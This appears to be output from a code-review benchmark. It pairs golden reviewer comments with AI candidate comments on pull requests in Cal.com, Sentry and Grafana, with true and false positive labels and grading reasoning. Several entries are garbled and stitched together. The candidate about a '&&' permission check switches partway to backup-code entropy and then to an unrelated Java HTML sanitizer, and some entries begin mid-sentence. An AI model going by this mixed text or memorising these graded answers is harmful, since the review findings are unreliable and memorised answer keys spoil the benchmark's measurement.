The PR description explicitly says "I haven't added tests that prove my fix is effective or that my feature works". The two new endpoints (`/api/webhook/app-credential`), the two new helpers (`parseRefreshTokenResponse`, `refreshOAuthTokens`), and the new `APP_CREDENTIAL_SHARING_ENABLED` constant together introduce a security-sensitive credential-syncing path. At a minimum: (1) webhook secret check accepts correct header and rejects wrong/absent; (2) Zod schema rejects malformed bodies and gives a 400; (3) symmetricDecrypt with wrong key is caught and is a 4xx, not a 500; (4) race against a concurrent identical webhook does not 500 (or returns idempotently); (5) `parseRefreshTokenResponse` does not silently fabricate a refresh_token; (6) `APP_CREDENTIAL_SHARING_ENABLED` is a boolean, not a string. None of these are covered.

false_negatives.golden_comment: When APP_CREDENTIAL_SHARING_ENABLED and CALCOM_CREDENTIAL_SYNC_ENDPOINT are set, the refreshFunction helper returns the fetch Response, but several callers (for example GoogleCalendarService.refreshAccessToken expecting res.data, and HubspotCalendarService.refreshAccessToken expecting a HubspotToken) assume it returns the integration-specific token object. That mismatch will cause runtime errors in the sync-enabled path unless the return type or those call sites are adjusted.

When the sync endpoint path is used, res is a fetch Response and has no .data; res?.data will be undefined and token.access_token will throw at runtime. This relies on a consistent return shape from refreshOAuthTokens, which isn’t guaranteed currently.

The `refreshOAuthTokens` function is passed `credentialId` instead of `userId`, which breaks the credential sync functionality by causing incorrect user lookups. This issue can lead to failures in syncing user credentials, impacting user experience.

The `jsforce.Connection` is created using stale `credentialKey.access_token` and `credentialKey.instance_url` after a token refresh, which can lead to authentication failures and incorrect data access. Ensure that the connection is established using the refreshed token values instead.

true_positives.golden_comment: Asynchronous functions deleteScheduledEmailReminder and deleteScheduledSMSReminder are called without await inside forEach loops. This occurs during booking rescheduling/cancellation, and workflow/workflow step deletion/updates. Consequently, scheduled workflow reminders may not be reliably cancelled, potentially leaving them active.
true_positives.matched_candidate:
Reschedule workflow-reminder cleanup is fire-and-forget forEach, so errors never reach the caller

The block added inside `if (originalRescheduledBooking?.uid)` calls `deleteScheduledEmailReminder(...)` and `deleteScheduledSMSReminder(...)` from a `forEach` callback. The async functions return promises that are never awaited, and the surrounding `try/catch` only catches synchronous throws from the iteration body (the callback itself doesn't throw synchronously). Consequence: any error thrown asynchronously by SendGrid/Twilio/Prisma is swallowed inside the helper's own try/catch, the booking is treated as successfully rescheduled, and the caller (`handleNewBooking` -> the rescheduling user) has no signal that the prior booking's reminders failed to cancel. This also means the SMS-side Twilio cancel for the old booking and the immediate SendGrid cancel for the old booking can complete after `eventManager.reschedule(...)` has already mutated external calendars and the new reminders have been scheduled, producing a race where both old and new reminders can fire. Use `await Promise.all(reminders.map(...))` or a `for..of` with `await` so the cancellation actually completes (and any error is surfaced) before the reschedule continues.
true_positives.reasoning: The candidate identifies the same underlying bug: asynchronous email and SMS reminder deletion functions are called without awaiting their promises inside forEach during rescheduling, so cancellation may not complete reliably and old reminders may remain active. It covers a narrower occurrence than the golden comment but matches the core issue.

true_positives.golden_comment: When immediateDelete is true, the deleteScheduledEmailReminder function cancels the SendGrid email but fails to delete the corresponding WorkflowReminder record from the database. This creates orphaned database entries and is inconsistent with the immediateDelete: false path, which marks the record as cancelled. The SendGrid DELETE API call is also omitted in this path.
true_positives.matched_candidate:
immediateDelete=true path leaves `cancelled` flag unset, so failed SendGrid calls have no retry

When `deleteScheduledEmailReminder` is called with `immediateDelete=true` (used by reschedule in `handleNewBooking.ts` and by workflow/step deletion in `workflows.tsx`), the function only calls `client.request` and returns without updating the DB row. If SendGrid's cancel call fails (network blip, transient 5xx, batch not found, rate limit), the SendGrid scheduled-send remains active, but the `cancelled` column stays null, so the new `scheduleEmailReminders` CRON cannot pick it up and retry — the email will be sent. For comparison, the `immediateDelete=false` path correctly sets `cancelled: true`, allowing the CRON to clean it up later. The fix is to set `cancelled: true` unconditionally (or at minimum when the SendGrid call throws) so the cron-based retry is available as a fallback for the immediate path.
true_positives.reasoning: Both identify that the immediateDelete=true branch calls SendGrid but leaves the WorkflowReminder database record unchanged, unlike the false branch that marks it cancelled. The candidate emphasizes failed-call retries rather than orphaned records and does not mention the missing SendGrid DELETE call, but it identifies the same underlying database-cleanup bug.

true_positives.golden_comment: The 'cancelled' field is nullable, which can lead to existing records having null values instead of a default of false. This can cause incorrect behavior in the application when checking the cancellation status of reminders.
true_positives.matched_candidate:
Pre-existing mistakenly-unscheduled emails from PR #6991 will still be delivered

The PR description notes that the previous (DELETE-based) fix actually re-scheduled emails instead of cancelling them, and that those emails are still in SendGrid's queue. The migration only adds `cancelled` as nullable with no default, so existing `WorkflowReminder` rows have `cancelled = NULL` and the new CRON filter `cancelled: true` will not match them — SendGrid will deliver those legacy emails. This needs to be called out in the PR description and either accompanied by a one-off cleanup query (delete or `cancelled: true`-backfill for past reminders) or acknowledged as a known operational issue.
true_positives.reasoning: The candidate explicitly identifies the same underlying issue: the nullable cancelled field has no false default, leaving existing records NULL and causing cancellation-status filtering to behave incorrectly. Its focus on legacy email delivery is a specific consequence of that issue.

false_positives.candidate:
CRON cancellation loop aborts on first SendGrid error, orphaning prior DB deletes

In the new `remindersToCancel` loop, the `for (const reminder of remindersToCancel)` calls `await client.request(...)` first, then pushes a `prisma.workflowReminder.delete(...)` onto `workflowRemindersToDelete`. The outer `try/catch` wraps the whole loop. If SendGrid's `POST /v3/user/scheduled_sends` returns an error for reminder N (rate limit, already-sent batch, transient 5xx, etc.), the `await` throws and the loop is aborted. `Promise.all(workflowRemindersToDelete)` is never called, so the deletes for reminders 0..N-1 whose SendGrid cancellation already succeeded are silently dropped. Those rows stay in the DB with `cancelled: true`, so the next CRON run re-fetches them, SendGrid returns 'batch not found' for the already-cancelled ones, and the deletes keep failing forever (until the past-date deleteMany eventually clears them). The fix is either to push the delete before the SendGrid call, do the delete inside the same per-iteration try/catch so a SendGrid failure cannot abort the loop, or push both into per-reminder Promise.all blocks.

Cancellation response returns before workflow reminders are actually cancelled

The new block `updatedBookings.forEach((booking) => { booking.workflowReminders.forEach((reminder) => { ... deleteScheduledEmailReminder(...); deleteScheduledSMSReminder(...); }); });` is invoked without awaiting the returned promises. The handler immediately proceeds to `await Promise.all(prismaPromises.concat(apiDeletes))` and then `sendCancelledEmails(evt)` and returns the success response. For SMS reminders with `referenceId` this means Twilio cancellation may not yet have been requested by the time the user sees 'Booking successfully cancelled.', so the old SMS can still go out. Errors raised inside the helpers are also swallowed by their own try/catch. Use `await Promise.all(updatedBookings.flatMap(b => b.workflowReminders.map(async r => ...)))` (or a `for..of` with `await`) so the handler waits for cancellation to actually happen and can propagate failures.

remindersToCancel query lacks defensive filters, can issue SendGrid calls with null batch_id

`prisma.workflowReminder.findMany({ where: { cancelled: true, scheduledDate: { lte: dayjs().add(1, 'hour').toISOString() } } })` does not restrict to `method: WorkflowMethods.EMAIL` nor to `referenceId: { not: null }`. While the new code in `deleteScheduledEmailReminder` only sets `cancelled: true` when a `referenceId` exists, stale data from the previous (DELETE-based) bug or any future code path that sets `cancelled: true` for SMS or unscheduled reminders will be picked up here and the loop will POST `{ batch_id: null, status: 'cancel' }` to SendGrid, which SendGrid rejects. Add `method: WorkflowMethods.EMAIL` and `referenceId: { not: null }` to the query so it only returns rows that can actually be cancelled.

Sequential await client.request in CRON can cause slow runs under burst cancellations

The cancellation loop does `await client.request(...)` once per reminder, sequentially, before pushing the delete onto the array. With the 100-pending SendGrid cap that motivated this PR, hitting that cap means up to 100 sequential SendGrid round trips per CRON run plus their delete operations. Given the CRON runs every 15 minutes and a serverless/edge runtime typically has a hard timeout, a burst of cancellations (e.g., a mass cancellation of a recurring series) can cause the handler to be killed mid-loop, leaving `cancelled: true` rows stranded until the next run. Consider parallelism (e.g., small batches with `Promise.all`) bounded below the SendGrid limit, or chunking the work across CRON invocations.

New reschedule-reminder cancellation path has no test coverage

The PR introduces a non-trivial new path: `getOriginalRescheduledBooking` now includes `workflowReminders`, and a new block iterates them to call `deleteScheduledEmailReminder(..., true)` / `deleteScheduledSMSReminder(...)` before `eventManager.reschedule`. None of the existing tests in the bookings router/handler area appear to cover (a) the case where a rescheduled booking has scheduled EMAIL reminders (immediate SendGrid cancel path), (b) the case where it has scheduled SMS reminders (immediate Twilio cancel path), or (c) the case where it has unscheduled reminders. Given that PR #6991 was the bug being fixed here, a regression test that asserts the new logic actually cancels reminders on reschedule should be added.

New cron-driven cancellation flow has no test coverage

The entire new branch — finding reminders with `cancelled: true && scheduledDate <= now+1h`, calling `POST /v3/user/scheduled_sends` with `status: 'cancel'`, and deleting the rows — is added without any unit or integration tests. The bug that motivated this PR was a misuse of the SendGrid API, so a test that mocks the SendGrid client and asserts (a) the POST is made with `status: 'cancel'`, (b) the row is deleted only after a successful cancel, and (c) rows past `scheduledDate` get cleaned up would protect against the same class of mistake recurring.

true_positives.golden_comment: The addGuests.handler.ts blacklist check uses blacklistedGuestEmails.includes(guest) after lowercasing the blacklist but not the input guest emails, allowing attackers to bypass BLACKLISTED_GUEST_EMAILS restrictions by submitting emails with uppercase characters.
true_positives.matched_candidate:
Blacklist comparison is case-sensitive, allowing bypass via mixed case

`blacklistedGuestEmails` is normalized with `.toLowerCase()`, but the `guest` value passed to `.includes(guest)` is the raw input. A blocked address can be submitted as e.g. "Bad@Email.com" and the check will miss it, so a blacklisted guest gets added to the booking and emailed. Normalize `guest` to lower case (or store a normalized form) before the includes check.
true_positives.reasoning: Both identify the same case-sensitive blacklist bypass: the blacklist is lowercased, but guest input is not normalized before includes(guest), allowing uppercase or mixed-case blocked emails through.

true_positives.golden_comment: The logic for checking team admin/owner permissions is incorrect. This condition uses AND (&&) which requires both isTeamAdmin AND isTeamOwner to be true, but it should use OR (||) since a user needs to be either an admin OR an owner to have permission.
true_positives.matched_candidate:
Permission check uses && instead of ||, locking out team admins

The `isTeamAdminOrOwner` is computed as `isTeamAdmin(...) && isTeamOwner(...)`. Each backup code is generated as `crypto.randomBytes(5).toString("hex")`, producing a 10-character hex string with only 40 bits of entropy. Modern guidance (NIST SP 800-63B) recommends at least 64 bits of entropy for OTP secrets, and 128 bits is common. Because the code is the only thing standing between an attacker and account access (it bypasses the TOTP factor), 40 bits is brute-forceable in a realistic timeframe, especially since failed attempts do not consume the code and the API has no per-user rate limiting on the credentials provider beyond the existing email-based limiter.

Use a constant-time comparison (e.g. compare each code with `crypto.timingSafeEqual` after length-checking). (2) The supplied code is only removed from the array after a successful match (`backupCodes[index] = null`), so failed attempts leave all 10 codes intact. Combined with the 40-bit entropy per code, this makes online brute force feasible: an attacker can submit unlimited guesses until one matches.

A leaked backup code therefore gives an attacker the ability to log in via the credentials provider and then turn off 2FA entirely, reducing the account to a single factor. Because `verifySafeHtml` does not declare any checked exceptions and `verify()` only catches `IOException`, this RuntimeException propagates out of the Mojo, bypassing the normal MojoExecutionException error path. The result is that any file whose English source is missing will abort the entire verification, instead of producing a clean message.

Locale-suffix regex doesn't accept digits, blocking non-Latin locale files

The path translation `replaceAll("_[a-zA-Z-_]*\\.properties", "_en.properties")` only matches locale suffixes that consist entirely of ASCII letters, hyphen and underscore. BCP-47 derived locales that include digits (e.g. `es_419`, `en_US_POSIX`, or numeric region sub-tags) will not match the regex, so `replaceAll` is a no-op and `englishFile` equals `file`. The code then tries to load the same file as its own English source and either crashes (because the regex `_[a-zA-Z-_]*` excludes digits) or silently validates a translation against itself. The character class also includes the underscore, which is fragile when suffixes themselves contain underscores (e.g. `zh_CN`).

This hardcoded string is presumed to be what the OWASP sanitizer inserts to disambiguate content, but the OWASP library is not part of the project's source, so this is an undocumented and version-dependent contract. If a future OWASP release inserts a different placeholder (e.g. `<!---->` without space, `<!---->`, or HTML-escaped form), the replacement will silently stop working and the sanitizer output will be reported as illegal HTML for any translation containing double curly braces. Worse, the replacement is applied unconditionally even when the original `value` legitimately contains the substring `<!-- -->`, in which case legitimate comments are silently stripped and the comparison will erroneously consider the value 'clean'.

In `santizeAnchors`, the Matcher is constructed from the original `value`, so `matcher.find()` continues to identify anchors at their original positions even after the body of the loop has replaced earlier occurrences in `value`. When the value contains the same anchor twice (e.g. two `<a href="X">`), the first iteration replaces the first occurrence in the (still identical) value, but the second iteration tries `value.replaceFirst(englishMatcher.group(), "")` on the already-shortened string, which no longer contains that anchor at that position. The replacement becomes a no-op, the loop advances to the next match in the original string, and the second anchor ends up compared against the next English anchor (or causes a spurious 'did not find anchor tag' message). The logic should either rebuild the Matcher after each replacement or use indices rather than `replaceFirst` to align modifications.

true_positives.golden_comment: The OptimizedCursorPaginator in organization_auditlogs.py attempts to use negative slice offsets on Django querysets, but Django querysets do not support negative slicing and will raise an AssertionError.
true_positives.matched_candidate:
Negative-offset slicing crashes Django QuerySet

In OptimizedCursorPaginator.get_result, the advanced-features branch sets `start_offset = cursor.offset` (which can be negative) and then does `results = list(queryset[start_offset:stop])`. Django QuerySet slicing explicitly disallows negative indices and raises `AssertionError: Negative indexing is not supported` (or the equivalent TypeError on newer Django). The "negative offset support" advertised by the new class therefore crashes the request whenever a client sends a cursor with a negative offset. There is no defensive clamp (`max(0, ...)`) and no fallback, so the feature is non-functional in practice.

The golden comment places this in organization_auditlogs.py while the candidate places it in get_result. That is a minor location detail, not a different issue.

true_positives.golden_comment: get_item_key assumes a numeric key, but the paginator is used with order_by=-datetime in the audit logs endpoint; calling math.floor/ceil on a datetime will raise a TypeError.

The endpoint wires this paginator in with `order_by="-datetime"`, so `self.key` is `"datetime"` and `getattr(item, "datetime")` returns a `datetime.datetime` object. `math.floor(datetime)` raises `TypeError: a float is required`, so every call through the new path (including the very first request, because `build_cursor` calls `key(...)` to seed the next/prev cursor) will raise 500. The optimized paginator should subclass `DateTimePaginator`'s key conversion (multiplier + strftime) or be otherwise datetime-aware.

false_positives.candidate:

Cursor offsets are parsed straight from the URL via `int(bits[1])` in `Cursor.from_string`, so any client (or buggy prior response) that produces a negative offset will now hit Django's negative-indexing AssertionError. The accompanying comment ("This is safe because the underlying queryset will handle boundary conditions") is factually wrong: Django does NOT handle negative slicing and the previous code did not claim to. The endpoint always passes `enable_advanced_features=True` when it opts in, so the flag is effectively dead. There is no documented or measurable performance improvement over DateTimePaginator/BasePaginator: the same queryset is built, sliced, and `build_cursor` is invoked identically. Either delete the class and the gating code, or implement the actual optimization (e.g. a keyset pagination scheme or a bounded lookup) and benchmark it.

true_positives.golden_comment: A race condition in BuildIndex allows multiple goroutines to concurrently build the same expensive index for the same key. This is caused by moving the b.cacheMu lock from protecting the entire function to only protecting the final cache assignment.
true_positives.matched_candidate:
Race condition introduced by removing BuildIndex global lock

The diff removes `b.cacheMu.Lock()` at the start of `BuildIndex` and only acquires it around the final `b.cache[key] = idx` assignment. As a result, two concurrent calls for the same key can both pass through `GetIndex` (which takes only an RLock and returns nil for a missing entry) and concurrently execute `BuildIndex` for the same key. Both will then race on `b.cache[key] = idx` with last-writer-wins. At startup this is reachable whenever a gRPC request lands while `searchSupport.init` is still building a namespace, and at runtime it is reachable whenever a search request races with `getOrCreateIndex`. Previously the lock held for the whole build prevented this entirely; now the cache can contain stale indexes, and the second build allocates a whole new bleve index (potentially on disk under `b.opts.Root`) that is then orphaned. The fix in `getOrCreateIndex` only acquires the index after the build returns, so callers that retrieved the earlier index write to an index that is no longer the cached one. A per-key mutex, singleflight.Group, or sync.Map with double-checked loading is needed to make this safe.
true_positives.reasoning: The candidate describes the same race condition. Moving the cacheMu lock to cover only the final assignment lets multiple goroutines concurrently build the same index for the same key.

false_positives.candidate:
Reordering search.init before initWatcher loses events written in the gap

The diff reorders `Init` to call `s.search.init(ctx)` first and then `s.initWatcher()`. Previously the broadcaster/stream was attached before the search index was built. `searchSupport.init` builds the index from a snapshot taken via `GetResourceStats`/`ListIterator` that returns when its last `ListIterator` completes. Any writes that hit the SQL backend between that point and when `s.initWatcher` starts (and calls `WatchWriteEvents` -> `listLatestRVs` to compute its `since`) are NOT in the search index snapshot AND are NOT yet visible to the watcher, so they are silently dropped from the search index. With the old order, the watcher (poller) was already running, so its `since` was at or after the build's last read RV. The fix is either to keep the original order or to pass an explicit `since` (the last RV read by `searchSupport.init`) into `initWatcher` so its polling starts at that RV.

NewResourceServer now fails if init fails, breaking callers that relied on lazy init

`NewResourceServer` now calls `s.Init(ctx)` synchronously and returns `(nil, err)` on any init failure (lifecycle hook, search init, or watcher startup). Previously, init was deferred to the first RPC and a server object was always returned. Callers (e.g., the storage server module wiring) that construct the server, register it, and then serve traffic will now fail at construction time on any transient init failure. The PR description explicitly flags this as a question for the reviewer ("Does anything else depend on initializing US lazily?") but the chosen behavior change is significant: a slow/unhealthy database at startup, a corrupt bleve index directory, or any failure in `s.lifecycle.Init` / `s.search.init` will now prevent the storage server module from starting at all. Either keep the lazy path (with a context that isn't the per-RPC deadline) or ensure every caller of `NewResourceServer` is updated and tested for the eager-failure case.

NewResourceServer leaks backend resources when Init fails

When `s.lifecycle.Init(ctx)` succeeds (which is what opens the SQL database connection in the SQL backend's `initLocked`) but a later step in `s.once.Do` (search init or `initWatcher`) fails, `NewResourceServer` returns `(nil, err)` without calling `s.Stop`. There is no `defer` to call `s.cancel()` or to call `s.lifecycle.Stop`. The SQL backend's database handle (`b.db`), open bleve file indices on disk under `b.opts.Root`, and any goroutines started during partial init are left running. A successful subsequent `NewResourceServer` call for the same backend then races against the leaked resources. Add a cleanup path on the failure branch.

Data race on outer `err` variable inside errgroup goroutine

Inside `searchSupport.init`, the errgroup goroutine does `_, _, err = s.build(...)` and then `return err`, where `err` is the outer named variable declared just above the `for` loop. With `group.SetLimit(s.initWorkers) > 1`, multiple goroutines write to the same outer `err` concurrently. The race is benign here because the goroutines also `return err` and `group.Wait()` is reassigned to `err` immediately after, but it is still a data race per the Go memory model and a race detector run will flag it. Use `_, _, buildErr := s.build(...)` and return `buildErr`.

BuildIndex still discards the traced context

This PR's stated goal is to "fix trace propagation by passing span contexts down". `searchSupport.init`, `searchSupport.build`, and `backend.GetResourceStats` were all updated from `_, span := ...` to `ctx, span := ...` so the new context flows into downstream calls. `bleveBackend.BuildIndex` is the only other function touched in this PR that still uses `_, span := b.tracer.Start(ctx, tracingPrexfixBleve+"BuildIndex")`. The span exists but the returned context is dropped, which is the same bug the PR claims to fix. Apply the same `ctx, span :=` change here for consistency, even though the builder closure currently captures its own context from the caller.

Trace propagation fix is incomplete in backend.go

The PR description says "Fixes trace propagation by passing span contexts down" and updates `GetResourceStats` from `_, span := ...` to `ctx, span := ...`. Other methods in the same file (`WriteEvent` at line 158, `ReadResource` at line 353, `ListIterator` at line 388, `poll` at line 664, `resourceVersionAtomicInc` at line 718) still use `_, span := b.tracer.Start(ctx, ...)`, discarding the returned context. Downstream DB calls made with the outer `ctx` (not the traced context) therefore do not appear as children of these spans. Either the fix is intentionally scoped (in which case the PR description is misleading) or these should all be updated to `ctx, span :=`.

Postgres support in the storage-server integration test is skipped rather than fixed

The diff adds a `t.Skip` for `dbType == "postgres"` with a TODO to fix the test. This PR changes the most fundamental part of the storage server lifecycle (where initialization runs) but provides no new test coverage for that change, and the only integration test that exercises `InitializeModuleServer` with `modules.StorageServer` is now skipped on the very backend the storage server is required to support. Combined with the eager-init behavior change in `NewResourceServer`, this leaves a regression in postgres untested. Either unblock the test or add a dedicated test that exercises `NewResourceServer` -> eager init -> a Search gRPC call end-to-end on a real backend.

successful index build still logs duration but index size is constant

The new `s.log.Info("search index initialized", "duration_secs", end-start, "total_docs", s.search.TotalDocs())` reports `total_docs` from `bleveBackend.TotalDocs()`, which iterates `b.cache` at the moment init's search goroutines return. Because `searchSupport.init` uses `errgroup.Group` with `group.SetLimit(s.initWorkers)`, multiple `BuildIndex` calls may still be in flight when init's group.Wait() returns only the FIRST error; if no error occurred, `group.Wait` returns nil and the cache may not yet contain every index that was being built (the cache assignment happens inside `bleveBackend.BuildIndex`, after `builder(idx)` and `idx.Flush()`, and is only protected by `cacheMu`). Worse, if any one of those last in-flight builds fails after some succeed, the log line is never reached but partial state is reported earlier. This is a minor observability concern, but combined with the bleve lock-removal race it understates how many indexes were actually built.

true_positives.matched_candidate:
AssignmentSource.queued default is evaluated once at class definition, not per instance

The field `queued: datetime = timezone.now()` is a plain dataclass default, so `timezone.now()` is called exactly once at class body evaluation (i.e. at module import time) and the resulting `datetime` is reused as the default for every instance that does not override it. The fix is to use a per-instance factory: `queued: datetime = field(default_factory=timezone.now)` (with `from dataclasses import field`). The existing `test_to_dict` only asserts `queued is not None`, so it does not catch this regression.
